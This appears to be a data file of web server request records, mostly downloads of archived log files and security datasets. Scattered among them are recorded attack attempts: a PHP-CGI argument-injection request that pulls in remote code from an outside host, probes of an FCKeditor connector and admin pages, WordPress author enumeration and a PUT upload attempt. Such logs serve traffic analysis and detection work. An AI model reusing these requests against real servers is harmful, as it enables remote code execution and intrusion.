48,1,200,0,GET /self.logs/access.log.2015-11-15.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-12-09.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-10-16.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-09-30.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-09-26.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-06-17.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-08-28.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-01-31.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-06-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-06-24.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-11-28.gz HTTP/1.1
47,1,301,0,GET /self.logs/error.log.2016-02-04.gz HTTP/1.1
47,1,301,0,GET /self.logs/error.log.2015-12-24.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-07-17.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-04-07.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-25.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-08-06.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-09-19.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-17.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-09-13.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2017-01-18.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-02-25.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-08-16.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-12-04.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-29.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-06-28.gz HTTP/1.1
18,1,404,0,GET /data HTTP/1.1
18,1,404,0,GET /data HTTP/1.0
48,1,200,0,GET /self.logs/access.log.2016-04-18.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-05-05.gz HTTP/1.1
47,1,301,0,GET /self.logs/error.log.2016-01-23.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-01-04.gz HTTP/1.1
37,1,200,0,HEAD /maccdc2012/conn.log.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-03-28.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-05.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-09-27.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-03-25.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-07-30.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-06-28.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-01-23.gz HTTP/1.1
29,1,404,0,GET /theme/style.css HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-06-15.gz HTTP/1.1
47,1,301,0,GET /self.logs/error.log.2016-01-03.gz HTTP/1.1
23,1,301,0,GET /pe_static HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-09-30.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-07-11.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-14.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-12-28.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-08-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-12-22.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-09-19.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-10-17.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-21.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-02-19.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-05-05.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-02-27.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-05-13.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-06-16.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-09-29.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-11-04.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-04-15.gz HTTP/1.1
47,1,404,1,GET /honeypot/honeypot%20-%20howto.pdf HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-06-11.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-02-09.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-18.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2017-01-16.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2017-01-07.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-01-05.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-09.gz HTTP/1.1
22,1,304,0,GET /tg/a.zip HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-27.gz HTTP/1.1
37,1,200,0,HEAD /maccdc2012/smtp.log.gz HTTP/1.1
38,1,404,0,GET /access.log.2016-03-22.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-09-07.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-01-17.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-11.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-09-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-09-30.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-25.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-08-16.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-04.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-26.gz HTTP/1.1
38,1,200,0,GET /pe_static/op-cleaver.zip HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2017-01-23.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2017-01-14.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-01-05.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-05-14.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-11-10.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-09-01.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-02.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-17.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-09-25.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-02-08.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-06-03.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-31.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-08-18.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-01-18.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-10-19.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-31.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-01-07.gz HTTP/1.1
24,1,405,0,PUT /awyjyk.txt HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-16.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-22.gz HTTP/1.1
18,1,200,0,OPTIONS / HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-04-03.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-12-21.gz HTTP/1.1
47,1,301,0,GET /self.logs/error.log.2015-12-22.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-07-20.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-11-27.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-08-15.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-05-22.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-07-13.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-11-05.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-08-31.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-06-18.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-26.gz HTTP/1.1
29,1,301,0,GET /blog/robots.txt HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-05.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-10-13.gz HTTP/1.1
30,1,404,0,GET /img/flags/vg.gif HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-07-22.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-08.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-06.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-26.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-05-28.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-08-26.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-24.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2017-01-15.gz HTTP/1.1
17,1,301,0,GET /wp/ HTTP/1.1
18,1,404,0,GET /feed HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-05-23.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-09-26.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2017-01-31.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-10-13.gz HTTP/1.1
36,1,200,0,HEAD /maccdc2012/dns.log.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-06-06.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-03-03.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-09-07.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-06-20.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-21.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-09-12.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-30.gz HTTP/1.1
30,1,404,0,GET /ComputerInfo.bin HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-10-31.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-06-07.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-02-01.gz HTTP/1.1
38,1,200,0,HEAD /maccdc2012/weird.log.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-12-11.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-04-11.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-12-20.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-11-22.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-04-09.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-06-15.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-10-15.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-09-10.gz HTTP/1.1
31,1,404,1,GET /honeypot/Honeypot HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-09-14.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-12-21.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-12-03.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-06-05.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-04-18.gz HTTP/1.1
22,1,404,0,GET /back.css HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-10-31.gz HTTP/1.1
165,4,404,0,GET /shop//fckeditor/editor/filemanager/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=%2F&uuid=14430306259051487022624981 HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-09-28.gz HTTP/1.1
37,1,200,0,GET /maccdc2012/weird.log.gz HTTP/1.1
37,1,200,0,GET /maccdc2012/weird.log.gz HTTP/1.0
47,1,200,0,GET /self.logs/error.log.2015-06-15.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-05-13.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-23.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-04-02.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-12-18.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-27.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2017-02-21.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-28.gz HTTP/1.1
40,1,200,1,GET /honeypot/honeypot.json.zip HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-18.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-10-30.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-06-12.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-12-25.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-10-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-01.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-10-22.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-03-19.gz HTTP/1.1
50,2,200,0,GET /?from=singlemessage&isappinstalled=1 HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-09-11.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-07-14.gz HTTP/1.1
23,1,200,0,GET /?author=1 HTTP/1.0
23,1,200,0,GET /?author=1 HTTP/1.1
24,1,200,0,GET /?feed=rss2 HTTP/1.1
47,1,301,0,GET /self.logs/error.log.2016-01-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-04-08.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-01-25.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-12-25.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-05-31.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-07.gz HTTP/1.1
29,1,404,0,GET ///@phunter_lau: HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-12-18.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-24.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-06-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-18.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-02-05.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-04-07.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-04-08.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-07-25.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-17.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-08-30.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-11-30.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-11-03.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-11-18.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-12.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-20.gz HTTP/1.1
41,1,404,1,GET /honeypot/Honeypot-Howto.pdf HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-04-19.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-08-02.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-05-29.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-02-20.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-11.gz HTTP/1.1
50,1,200,0,HEAD /maccdc2012/maccdc2012_fast_alert.7z HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-12-01.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-11-06.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-05-05.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-07-31.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-03-29.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-09-27.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-10-24.gz HTTP/1.1
28,1,404,0,GET /theme/wait.gif HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-04-30.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-09-16.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-08-06.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-06-26.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-01-22.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-07.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-02-03.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-03-31.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-31.gz HTTP/1.1
16,1,200,0,GET /// HTTP/1.1
23,1,404,0,GET /style.css HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-06-30.gz HTTP/1.1
36,1,200,0,HEAD /maccdc2012/ssl.log.gz HTTP/1.1
37,1,200,0,HEAD /maccdc2012/dhcp.log.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2017-02-27.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-04-29.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-05-01.gz HTTP/1.1
37,1,404,0,GET /error.log.2015-06-09.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-26.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-03-03.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-02-11.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-03-17.gz HTTP/1.1
99,4,200,0,GET /?utm_content=buffer35ad2&utm_medium=social&utm_source=twitter.com&utm_campaign=buffer HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-02-10.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-12.gz HTTP/1.1
38,1,404,0,GET //wp-admin/admin-ajax.php HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-04-28.gz HTTP/1.1
35,1,200,0,GET /maccdc2012/ssh.log.gz HTTP/1.0
35,1,200,0,GET /maccdc2012/ssh.log.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-01-21.gz HTTP/1.1
30,1,404,0,GET /transformers.txt HTTP/1.0
48,1,200,0,GET /self.logs/access.log.2016-10-10.gz HTTP/1.1
165,4,404,0,GET /shop//fckeditor/editor/filemanager/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=%2F&uuid=14430306259051487057864743 HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-05-30.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-11-16.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-23.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-12-27.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-12-06.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-06-24.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-04-06.gz HTTP/1.1
31,1,404,0,GET /imgs/flags/mm.png HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-16.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-11-04.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-02-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-08-17.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-02-02.gz HTTP/1.1
36,1,200,0,HEAD /maccdc2012/ftp.log.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-04-29.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-07-08.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-02-04.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-06-27.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-07-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-05-06.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-07-01.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-02-03.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-09-18.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-02-07.gz HTTP/1.1
125,1,200,0,GET /?-d%20allow_url_include%3DOn+-d%20auto_prepend_file%3Dhttp://www.intecs.ru/sites/default/files/languages/30.txt HTTP/1.1
49,1,200,0,GET /maccdc2012/maccdc2012_fast_alert.7z HTTP/1.0
49,1,200,0,GET /maccdc2012/maccdc2012_fast_alert.7z HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-07-19.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-07-13.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-26.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-03-24.gz HTTP/1.1
64,1,404,1,GET /honeypot//%22http://amunhoney.sourceforge.net//%22 HTTP/1.1
40,1,404,0,GET /data/js/jquery.validate.js HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-24.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-10-12.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-09-20.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2017-01-05.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-07.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-06-30.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-09-22.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-04.gz HTTP/1.1
21,1,404,0,GET /ifg.php HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-08-24.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-05-22.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-09-03.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-05-12.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-06-29.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-08-01.gz HTTP/1.1
32,1,200,0,GET /self.logs/?C=D;O=D HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-09.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-12-02.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-12-08.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-04-08.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-12-29.gz HTTP/1.1
53,1,404,1,GET /honeypot//%22http://www.maxmind.com/%22 HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-11-23.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-06-07.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-04-05.gz HTTP/1.1
37,1,404,0,GET /administrator/index.php HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-01-22.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-11-19.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-10-25.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-03-20.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-09-11.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-09-23.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-02-17.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-27.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-02-25.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-21.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-05-13.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-07-05.gz HTTP/1.1
21,1,404,0,GET /rss.xml HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-23.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-11-29.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-04-12.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-10-20.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-07-08.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-20.gz HTTP/1.1
53,1,404,1,GET /honeypot/BSidesDFW%20-%202014.ipynb'A=0 HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-10-30.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-09.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-08-29.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-01-26.gz HTTP/1.1
49,1,404,0,GET /admin/javascripts/extended_debug.js HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-12-30.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-15.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-04-27.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-05-09.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-10-07.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-23.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-12-02.gz HTTP/1.1
33,1,404,0,GET /assets/img/logo.png HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-06-19.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-15.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-09-11.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-09-14.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-06-08.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-05-22.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-12-14.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-11-27.gz HTTP/1.1
32,1,200,0,GET /self.logs/?C=N;O=A HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-04-04.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2017-01-30.gz HTTP/1.1
24,1,200,0,GET /index.html HTTP/1.0
47,1,200,0,GET /self.logs/error.log.2017-01-28.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-12-21.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-02-14.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-02-28.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-05-29.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-12.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-02-23.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-02-26.gz HTTP/1.1
